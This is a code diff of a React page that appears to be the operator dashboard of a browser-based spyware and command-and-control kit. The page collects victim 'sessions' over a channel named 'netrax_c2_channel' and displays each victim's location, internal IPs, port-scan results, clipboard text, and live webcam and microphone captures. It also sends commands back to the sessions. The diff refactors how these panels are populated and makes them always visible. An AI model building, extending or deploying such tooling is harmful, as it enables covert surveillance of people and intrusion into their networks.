@@ -26,14 +26,10 @@ export default function LiveTrackerPage() {
   const { value: sessions, setValue: setSessions } = useLocalStorage<Record<string, TrackedEvent[]>>('netra-sessions', {});
   const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
 
-  const [location, setLocation] = useState<{lat: number, lon: number} | null>(null);
-  const [internalIps, setInternalIps] = useState<string[]>([]);
-  const [openPorts, setOpenPorts] = useState<{target: string, port: number}[]>([]);
-  const [clipboardContent, setClipboardContent] = useState<string | null>(null);
-  const [liveFeedSrc, setLiveFeedSrc] = useState<string | null>(null);
   const [isCameraActive, setIsCameraActive] = useState(false);
   const [isMicActive, setIsMicActive] = useState(false);
   const [isRecording, setIsRecording] = useState<'video' | 'audio' | null>(null);
+  const [liveFeedSrc, setLiveFeedSrc] = useState<string | null>(null);
   
   const { toast } = useToast();
   const { user } = useAuth();
@@ -50,20 +46,17 @@ export default function LiveTrackerPage() {
   };
   
   const resetStateForSession = () => {
-    setLocation(null);
-    setInternalIps([]);
-    setOpenPorts([]);
-    setClipboardContent(null);
-    setLiveFeedSrc(null);
     setIsCameraActive(false);
     setIsMicActive(false);
+    setLiveFeedSrc(null);
     setIsRecording(null);
   }
 
   // Centralized event listener for C2 data
   useEffect(() => {
-    const c2Channel = new BroadcastChannel('netrax_c2_channel');
-    const handleC2Message = (event: MessageEvent<TrackedEvent>) => {
+    channelRef.current = new BroadcastChannel('netrax_c2_channel');
+    
+    const handleC2Message = (event: MessageEvent) => {
       const newEvent = event.data;
       if (!newEvent.sessionId) return;
       
@@ -75,66 +68,40 @@ export default function LiveTrackerPage() {
           [newEvent.sessionId]: updatedEvents
         };
       });
-    };
-    c2Channel.addEventListener('message', handleC2Message);
-    return () => c2Channel.removeEventListener('message', handleC2Message);
-  }, [setSessions]);
-  
-  // Media control listener
-  useEffect(() => {
-    channelRef.current = new BroadcastChannel('netrax_c2_channel');
-    const handleMediaMessage = (event: MessageEvent) => {
-        if (event.data.type === 'media-stream') {
-            const { data, sessionId } = event.data;
-            if (data.type === 'image-snapshot' && sessionId === selectedSessionId) {
+
+      if (newEvent.sessionId === selectedSessionId) {
+        if (newEvent.type === 'media-stream') {
+            const { data } = newEvent;
+            if (data.type === 'image-snapshot') {
                 setLiveFeedSrc(data.snapshot);
                 setIsCameraActive(true);
             } else if (data.type === 'status') {
-                 if (sessionId === selectedSessionId) {
-                    if (data.message === 'Permissions granted.') {
-                       setIsCameraActive(true);
-                       setIsMicActive(true);
-                    } else if (data.message === 'Stream stopped.') {
-                        setIsCameraActive(false);
-                        setIsMicActive(false);
-                        setLiveFeedSrc(null);
-                    } else {
-                        toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${sessionId} reported: ${data.message}`});
-                    }
+                if (data.message === 'Permissions granted.') {
+                    setIsCameraActive(true);
+                    setIsMicActive(true);
+                } else if (data.message === 'Stream stopped.') {
+                    setIsCameraActive(false);
+                    setIsMicActive(false);
+                    setLiveFeedSrc(null);
+                } else {
+                    toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${newEvent.sessionId} reported: ${data.message}`});
                 }
             }
         }
+      }
     };
-    channelRef.current.addEventListener('message', handleMediaMessage);
+
+    channelRef.current.addEventListener('message', handleC2Message);
     return () => {
-      channelRef.current?.removeEventListener('message', handleMediaMessage);
-      channelRef.current?.close();
+        channelRef.current?.removeEventListener('message', handleC2Message);
+        channelRef.current?.close();
     };
-  }, [selectedSessionId, toast]);
-
-  // Effect to update card visibility based on session data
-  useEffect(() => {
-    if (selectedSessionId && sessions[selectedSessionId]) {
-        const sessionEvents = sessions[selectedSessionId];
-        const lastLocationEvent = sessionEvents.slice().reverse().find(e => e.type === 'location' && e.data.latitude);
-        setLocation(lastLocationEvent?.data ? { lat: lastLocationEvent.data.latitude, lon: lastLocationEvent.data.longitude } : null);
-
-        const foundIps = sessionEvents.filter(e => e.type === 'internal-ip-found').map(e => e.data.ip);
-        setInternalIps([...new Set(foundIps)]);
-        
-        const foundPorts = sessionEvents.filter(e => e.type === 'port-scan-result').map(e => e.data);
-        setOpenPorts(foundPorts);
-        
-        const lastClipboardEvent = sessionEvents.slice().reverse().find(e => e.type === 'clipboard-read');
-        setClipboardContent(lastClipboardEvent?.data.pastedText || null);
-    } else {
-        resetStateForSession();
-    }
-  }, [selectedSessionId, sessions]);
+  }, [setSessions, selectedSessionId, toast]);
   
    useEffect(() => {
     if (!selectedSessionId && sessionsMap.size > 0) {
-      setSelectedSessionId(sessionsMap.keys().next().value);
+      const firstSessionId = sessionsMap.keys().next().value;
+      setSelectedSessionId(firstSessionId);
     }
   }, [sessionsMap, selectedSessionId]);
 
@@ -159,6 +126,13 @@ export default function LiveTrackerPage() {
       sendCommandToSession(command);
       setIsRecording(null);
   }
+  
+  const currentSessionEvents = selectedSessionId ? sessions[selectedSessionId] || [] : [];
+  const location = currentSessionEvents.slice().reverse().find(e => e.type === 'location' && e.data.latitude)?.data;
+  const internalIps = [...new Set(currentSessionEvents.filter(e => e.type === 'internal-ip-found').map(e => e.data.ip))];
+  const openPorts = [...new Set(currentSessionEvents.filter(e => e.type === 'port-scan-result').map(e => e.data))];
+  const clipboardContent = currentSessionEvents.slice().reverse().find(e => e.type === 'clipboard-read')?.data.pastedText || null;
+
 
   return (
     <div className="flex flex-col gap-6">
@@ -179,11 +153,10 @@ export default function LiveTrackerPage() {
         <div className="xl:col-span-1 flex flex-col gap-6">
           <SessionHistory sessions={sessionsMap} setSessions={setSessionsFromMap} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
           
-          {(isCameraActive || isMicActive) && (
             <Card className="bg-primary/10">
               <CardHeader>
                   <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Media Control</CardTitle>
-                  <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge>
+                  { (isCameraActive || isMicActive) && <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge> }
               </CardHeader>
               <CardContent className="space-y-4">
                   <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center">
@@ -199,12 +172,11 @@ export default function LiveTrackerPage() {
                   </div>
               </CardContent>
             </Card>
-          )}
 
-          {internalIps.length > 0 && <InternalNetworkScannerResults ips={internalIps} />}
-          {openPorts.length > 0 && <PortScannerResults ports={openPorts} />}
-          {clipboardContent && <ClipboardMonitor content={clipboardContent} />}
-          {location && <LocationTracker location={location} />}
+          <InternalNetworkScannerResults ips={internalIps} />
+          <PortScannerResults ports={openPorts} />
+          <ClipboardMonitor content={clipboardContent} />
+          <LocationTracker location={location ? { lat: location.latitude, lon: location.longitude } : null} />
         </div>
       </div>
     </div>
